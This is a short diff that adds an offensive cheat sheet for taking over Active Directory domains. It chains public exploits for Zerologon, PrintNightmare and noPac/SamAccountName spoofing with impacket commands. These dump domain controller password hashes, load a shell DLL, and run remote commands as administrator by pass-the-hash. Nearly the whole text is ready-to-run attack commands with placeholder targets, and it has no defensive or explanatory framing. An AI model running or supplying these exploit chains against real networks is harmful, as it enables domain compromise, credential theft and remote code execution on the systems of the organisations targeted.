@@ -1,0 +1,15 @@
+LDAP / AD → RCE
+bash# Zerologon (CVE-2020-1472) → DC admin → full domain RCE
+python3 cve-2020-1472-exploit.py DC_NETBIOS_NAME target_ip
+# Then dump hashes
+impacket-secretsdump -just-dc -no-pass DC_NETBIOS_NAME\$@target
+
+# PrintNightmare (CVE-2021-1675/34527)
+python3 CVE-2021-1675.py domain.com/user:pass@target /tmp/shell.dll
+
+# NoPac/SamAccountName spoofing (CVE-2021-42278/42287)
+python3 noPac.py domain.com/user:pass -dc-ip target -dc-host DCHOST -shell
+
+# Then RCE with new admin creds
+impacket-psexec administrator@target -hashes :NEW_HASH
+
